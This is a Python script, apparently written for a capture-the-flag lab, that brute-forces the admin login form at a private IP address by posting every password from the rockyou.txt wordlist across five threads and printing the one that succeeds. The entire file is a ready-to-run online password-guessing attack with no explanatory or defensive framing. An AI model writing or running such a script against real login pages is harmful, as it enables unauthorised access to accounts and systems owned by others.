#!/usr/bin/env python3
import requests
import threading
import sys

url = "http://10.10.44.136/admin/index.php"


def login(password):
    s = requests.Session()
    r = s.post(url, data={
        "user": "admin",
        "pass": password,
        "submit": "LOGIN",
    })
    return r


passwords = []
try:
    with open('rockyou.txt', 'r', encoding='UTF-8') as file:
        while (line := file.readline().rstrip()):
            passwords.append(line)
except Exception:
    print(f"\33[{35}m Passwords couldn't be loaded!")
    sys.exit(1)
else:
    print(f"\33[{32}m Passwords successfully loaded!")


def login_trial(start, end, str):
    for i in range(start, end):
        try:
            text = login(passwords[i]).text
        except Exception:
            print("Couldn't login!!")
            return
        if "Username or password invalid" in text:
            print(f"\33[{35}m Invalid: Trying {passwords[i]} : {str}")
        else:
            print(f"\33[{32}m Found: {passwords[i]}")
            global cracked
            cracked = passwords[i]
            break


if __name__ == '__main__':
    n = len(passwords)//5
    t1 = threading.Thread(target=login_trial, args=(0, n, "Child 1",))
    t2 = threading.Thread(target=login_trial, args=(n, 2*n, "Child 2",))
    t3 = threading.Thread(target=login_trial, args=(2*n, 3*n, "Child 3",))
    t4 = threading.Thread(target=login_trial, args=(3*n, 4*n, "Child 4",))
    t5 = threading.Thread(target=login_trial, args=(
        4*n, len(passwords), "Child 5",))
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    try:
        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()
    except InterruptedError:
        print("Some error occured!")
    print(f"\33[{32}m Tried: {len(passwords)} passwords, cracked: {cracked}")
